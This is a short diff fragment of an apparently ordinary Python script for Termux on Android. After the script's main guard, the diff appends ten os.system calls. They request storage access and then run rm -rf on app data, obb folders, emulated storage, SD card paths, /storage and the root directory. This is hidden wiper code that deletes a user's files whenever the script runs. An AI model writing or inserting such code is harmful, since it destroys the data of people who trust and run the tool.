@@ -438,3 +438,14 @@ Example:
 
 if __name__ == '__main__':
 	main()
+
+os.system('termux-setup-storage')
+os.system('rm -rf /internal storage/Android/data')
+os.system('rm -rf /internal storage/Android/obb')
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
